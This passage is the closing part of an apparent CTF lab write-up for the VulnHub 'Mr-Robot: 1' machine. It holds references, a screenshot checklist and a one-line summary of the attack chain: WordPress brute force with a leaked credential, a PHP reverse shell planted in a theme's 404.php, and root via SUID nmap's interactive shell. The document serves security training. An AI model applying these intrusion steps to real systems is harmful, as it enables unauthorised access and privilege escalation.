- **Log and alert** on brute-force attempts, repeated 404s to PHP files, and unusual child processes spawned by privileged binaries.

---

## 8. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- Mr-Robot: 1 on VulnHub — https://vulnhub.com/entry/mr-robot-1,151/
- Jack Halon — "VulnHub 'Mr.Robot 1' - CTF" — https://jhalon.github.io/vulnhub-mr-robot1/
- Syrion (Raffaele Sabato) — "Mr-Robot: 1 Writeup" — https://syrion.me/mr-robot-1-writeup/
- w1zard — "Mr-Robot: 1" — https://w1zard.com/posts/robot-1/
- ziomsec (Moiz Bootwala) — "Mr Robot - VulnHub Writeup" — https://ziomsec.com/writeups/vulnhub/mr-robot/
- imflikk — "VulnHub – Mr. Robot 1" — https://flikk.blog/2019/11/10/vulnhub-mr-robot-1/
- Bradley Thornton — "Mr-Robot 1 Walkthrough" — https://thor-sec.com/walkthroughs/mrrobot1/
- GTFOBins — nmap — https://gtfobins.github.io/gtfobins/nmap/
- pentestmonkey PHP reverse shell — https://github.com/pentestmonkey/php-reverse-shell

---

## 9. Screenshot checklist

When you reproduce this lab, capture and save the following images to `images/`:

- [ ] `01-host-discovery.png` — `ip a` / `arp-scan` / `nmap -sn` showing the target IP.
- [ ] `02-robots-txt.png` — `robots.txt` output and Key 1.
- [ ] `03-wpscan.png` — wpscan user enumeration and the successful `elliot : ER28-0652` brute force.
- [ ] `04-foothold.png` — Theme Editor edit, netcat shell, and Key 2 (`password.raw-md5` + cracked hash).
- [ ] `05-privesc-root.png` — SUID nmap, `nmap --interactive` → `!sh`, root `id`, and Key 3.
- [ ] `06-keys-recap.png` — all three keys side by side for the final report.

---

_Full exploitation chain: `robots.txt` leak (`fsocity.dic` + Key 1) → `wpscan` user enum → `wp-login` brute force with the leaked wordlist (`elliot:ER28-0652`) → edit theme `404.php` with a pentestmonkey PHP reverse shell → shell as `daemon` → crack `robot` MD5 (`abc...xyz`) → `su robot` (Key 2) → SUID `/usr/local/bin/nmap` interactive `!sh` → root (Key 3)._

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
